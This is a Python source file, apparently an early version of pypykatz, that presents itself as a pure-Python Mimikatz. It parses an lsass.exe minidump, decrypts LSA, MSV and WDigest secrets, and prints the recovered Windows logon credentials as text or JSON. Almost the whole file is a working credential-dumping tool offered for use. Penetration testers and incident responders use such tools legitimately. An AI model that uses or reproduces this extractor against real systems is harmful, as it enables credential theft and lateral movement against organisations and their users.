#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import io
import os
import re
import struct
import logging

from minidump.minidumpfile import MinidumpFile
from minidump.streams.SystemInfoStream import PROCESSOR_ARCHITECTURE

from pypykatz.commons.common import *
from pypykatz.lsadecryptor.lsa_decryptor import *
from pypykatz.lsadecryptor.lsa_templates import *
from pypykatz.lsadecryptor.packages.wdigest.wdigest_decryptor import *
from pypykatz.lsadecryptor.packages.wdigest.wdigest_templates import *
from pypykatz.lsadecryptor.packages.msv.msv_decryptor import * 
from pypykatz.lsadecryptor.packages.msv.msv_templates import * 


class pypykatz():
	"""mimikatz offline"""
	def __init__(self, minidump):
		self.minidump = minidump
		self.reader = minidump.get_reader().get_buffered_reader()
		self.credentials = []
		self.architecture = None
		self.operating_system = None
		self.buildnumber = None
		self.lsa_decryptor = None
		self.set_system_info()
		
		self.logon_sessions = None
		
	def set_system_info(self):
		if self.minidump.sysinfo.ProcessorArchitecture == PROCESSOR_ARCHITECTURE.AMD64:
			self.architecture = 'x64'
		elif self.minidump.sysinfo.ProcessorArchitecture == PROCESSOR_ARCHITECTURE.INTEL:
			self.architecture = 'x86'
			
		self.operating_system = self.minidump.sysinfo.OperatingSystem
		self.buildnumber = self.minidump.sysinfo.BuildNumber
		
	def get_logoncreds(self):
		template = LOGON_SESSION_DECRYPTOR_TEMPLATE(self.buildnumber, self.architecture).get_template()
		logoncred_decryptor = LogonCredDecryptor(self.reader, template, self.lsa_decryptor)
		logoncred_decryptor.start()
		self.logon_sessions = logoncred_decryptor.logon_sessions
	
	def get_lsa(self):
		lsa_dec_template = LSADecryptorTemplateFactory(self.buildnumber, self.architecture).get_template()
		lsa_dec = LsaDecryptor(self.reader, lsa_dec_template)
		logging.debug(lsa_dec.dump())
		return lsa_dec
	
	def get_wdigest(self):
		wdigest_dec_template = WDIGEST_DECRYPTOR_TEMPLATE(self.architecture, self.buildnumber).get_template()
		wdigest_dec = WdigestDecryptor(self.reader,wdigest_dec_template, self.lsa_decryptor)
		wdigest_dec.start()
		for cred in wdigest_dec.credentials:
			self.logon_sessions[cred.luid].wdigest_creds.append(cred)

	def start(self):
		self.lsa_decryptor = self.get_lsa()
		self.get_logoncreds()
		self.get_wdigest()
		
		

if __name__ == '__main__':
	import argparse

	parser = argparse.ArgumentParser(description='Pure Python implementation of Mimikatz -currently only minidump-')
	parser.add_argument('minidumpfile', help='path to the minidump file of lsass.exe')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('--json', action='store_true',help = 'Print credentials in JSON format')
	
	args = parser.parse_args()
	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
	else:
		logging.basicConfig(level=1)
	
	mf = MinidumpFile.parse(args.minidumpfile)
	mimi = pypykatz(mf)
	mimi.start()
	
	if args.json:
		for luid in mimi.logon_sessions:
			print(mimi.logon_sessions[luid].to_json())
	else:
		for luid in mimi.logon_sessions:
			print(str(mimi.logon_sessions[luid]))